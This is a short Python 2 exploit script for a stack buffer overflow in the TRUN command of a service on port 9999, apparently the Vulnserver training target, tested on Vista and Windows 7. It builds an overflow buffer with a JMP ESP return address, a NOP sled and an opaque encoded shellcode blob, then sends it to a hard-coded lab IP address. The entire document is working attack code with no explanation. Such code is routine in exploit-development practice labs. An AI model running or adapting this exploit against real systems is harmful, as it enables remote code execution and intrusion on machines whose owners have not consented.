#!/usr/bin/python
# coding: utf8
# TRUN direct EIP overwrite. Tested on Vista Enterprise SP2 32-bit and Windows 7 SP1 32-bit.

import socket
import time
IP = '192.168.10.134'
PORT = 9999
BUFFER_SIZE = 1024

shell = ("\xda\xd9\xd9\x74\x24\xf4\xba\x8d\x9a\x95\xd7\x5f\x33\xc9"
"\xb1\x4f\x31\x57\x19\x83\xc7\x04\x03\x57\x15\x6f\x6f\x69"
"\x3f\xe6\x90\x92\xc0\x98\x19\x77\xf1\x8a\x7e\xf3\xa0\x1a"
"\xf4\x51\x49\xd1\x58\x42\xda\x97\x74\x65\x6b\x1d\xa3\x48"
"\x6c\x90\x6b\x06\xae\xb3\x17\x55\xe3\x13\x29\x96\xf6\x52"
"\x6e\xcb\xf9\x06\x27\x87\xa8\xb6\x4c\xd5\x70\xb7\x82\x51"
"\xc8\xcf\xa7\xa6\xbd\x65\xa9\xf6\x6e\xf2\xe1\xee\x05\x5c"
"\xd2\x0f\xc9\xbf\x2e\x59\x66\x0b\xc4\x58\xae\x42\x25\x6b"
"\x8e\x08\x18\x43\x03\x51\x5c\x64\xfc\x24\x96\x96\x81\x3e"
"\x6d\xe4\x5d\xcb\x70\x4e\x15\x6b\x51\x6e\xfa\xed\x12\x7c"
"\xb7\x7a\x7c\x61\x46\xaf\xf6\x9d\xc3\x4e\xd9\x17\x97\x74"
"\xfd\x7c\x43\x15\xa4\xd8\x22\x2a\xb6\x85\x9b\x8e\xbc\x24"
"\xcf\xa8\x9e\x20\x3c\x86\x20\xb1\x2a\x91\x53\x83\xf5\x09"
"\xfc\xaf\x7e\x97\xfb\xd0\x54\x6f\x93\x2e\x57\x8f\xbd\xf4"
"\x03\xdf\xd5\xdd\x2b\xb4\x25\xe1\xf9\x1a\x76\x4d\x52\xda"
"\x26\x2d\x02\xb2\x2c\xa2\x7d\xa2\x4e\x68\x08\xe5\xd9\x53"
"\xa3\xe3\x9a\x3c\xb6\xf3\x9d\x07\x3f\x15\xf7\x67\x16\x8e"
"\x60\x11\x33\x44\x10\xde\xe9\xcc\xb1\x4d\x76\x0c\xbf\x6d"
"\x21\x5b\xe8\x40\x38\x09\x04\xfa\x92\x2f\xd5\x9a\xdd\xeb"
"\x02\x5f\xe3\xf2\xc7\xdb\xc7\xe4\x11\xe3\x43\x50\xce\xb2"
"\x1d\x0e\xa8\x6c\xec\xf8\x62\xc2\xa6\x6c\xf2\x28\x79\xea"
"\xfb\x64\x0f\x12\x4d\xd1\x56\x2d\x62\xb5\x5e\x56\x9e\x25"
"\xa0\x8d\x1a\x55\xeb\x8f\x0b\xfe\xb2\x5a\x0e\x63\x45\xb1"
"\x4d\x9a\xc6\x33\x2e\x59\xd6\x36\x2b\x25\x50\xab\x41\x36"
"\x35\xcb\xf6\x37\x1c")

#62501205 JMP ESP

buffer = "TRUN " + "A" * 2006 + "." + "\x05\x12\x50\x62" + "\x90" * 30 + shell + "\x43" * 2359

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))
time.sleep(2)
s.send(buffer)
data = s.recv(BUFFER_SIZE)
s.close()
print "received data:", data